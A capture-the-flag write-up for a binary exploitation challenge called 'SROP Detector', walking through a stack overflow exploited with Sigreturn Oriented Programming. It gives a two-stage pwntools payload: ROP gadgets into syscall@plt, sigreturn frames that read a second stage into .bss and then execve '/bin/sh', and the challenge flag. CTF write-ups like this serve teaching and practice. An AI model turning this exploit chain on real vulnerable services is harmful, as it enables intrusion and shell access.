# SROP Detector Writeup

## Description
```text
My friend Cebolinha send me this file called SROP detector. He always mispronounce "l" as "r" so I think this probably detects AI stuff
```

[slop_detector](https://dalctf2026.com/files/94641ea58d92a36f8deef0b1b24fe672/slop_detector?token=eyJ1c2VyX2lkIjozMjcsInRlYW1faWQiOjE4MywiZmlsZV9pZCI6NzE4fQ.aiby3Q.cbMjdGSgktZ9jZXS3ZhfBpiFoyE)
[Dockerfile](https://dalctf2026.com/files/8b8a3d5c1d22215e7ee54249b28defbb/Dockerfile?token=eyJ1c2VyX2lkIjozMjcsInRlYW1faWQiOjE4MywiZmlsZV9pZCI6NzQ0fQ.aiby3Q.NJlao4eU4n9LdWB7BpPEHcTGFKA)

## Solution Walkthrough

1. **Step 1**：

   The attack technique for this challenge is Sigreturn Oriented Programming, abbreviated as SROP.

   The program has a stack overflow when reading input, so we can first fill the buffer and saved RBP, then control the return address:

   ```python
   payload = b"A" * 72
   ```

   In this challenge, we can use syscall@plt to call libc's syscall() wrapper. Since we will later use syscall(15) to trigger rt_sigreturn, we can first call syscall(39) once to make syscall@plt finish lazy binding, which makes the later SROP more stable.

   ```python
   payload += p64(pop_rdi)
   payload += p64(39)
   payload += p64(syscall_plt)
   ```

2. **Step 2**：

   Call syscall(15) to trigger the first SROP.

   ```python
   payload += p64(pop_rdi)
   payload += p64(15)
   payload += p64(syscall_plt)
   payload += bytes(frame1)
   ```

   frame1 is set up to execute:

   ```c
   syscall(0, 0, bss, 0x500)    // read(0, bss, 0x500)
   ```

   Since the original stack does not have enough space for the complete second-stage payload, the purpose of the first SROP is to read the second-stage payload into `.bss` and pivot rsp to `.bss`.

   ```python
   frame1 = SigreturnFrame()

   frame1.rip = syscall_plt
   frame1.rdi = 0          # syscall number = read
   frame1.rsi = 0          # fd = stdin
   frame1.rdx = bss        # buf = bss
   frame1.rcx = 0x500      # count = 0x500
   frame1.rsp = bss        # stack pivot to .bss
   ```

3. **Step 3**：

   After the second-stage payload is read into `.bss`, it triggers rt_sigreturn again.

   ```python
   stage2 = b""

   stage2 += p64(pop_rdi)
   stage2 += p64(15)
   stage2 += p64(syscall_plt)
   stage2 += bytes(frame2)
   ```

   The goal of frame2 is to execute:

   ```c
   syscall(59, "/bin/sh", argv, NULL)     // execve("/bin/sh", ["/bin/sh", NULL], NULL)
   ```

   ```python
   binsh_addr = bss + 0x300
   argv_addr = bss + 0x320

   frame2 = SigreturnFrame()
   frame2.rip = syscall_plt
   frame2.rdi = 59             # syscall number = execve
   frame2.rsi = binsh_addr     # filename = "/bin/sh"
   frame2.rdx = argv_addr      # argv
   frame2.rcx = 0              # envp = NULL
   frame2.rsp = bss + 0x500
   ```

   Then place the `/bin/sh` string and argv inside `.bss`:

   ```python
   stage2 = stage2.ljust(0x300, b"\x00")
   stage2 += b"/bin/sh\x00"

   stage2 = stage2.ljust(0x320, b"\x00")
   stage2 += p64(binsh_addr)
   stage2 += p64(0)
   ```

   After the second SROP, `/bin/sh` will be executed. After getting a shell, enter:

   ```bash
   cat /flag.txt
   ```

   Then we can get the flag.

## Flag

```text
dalctf{1_r34lly_h0p3_u_d1dnt_sl0p_1t}
```
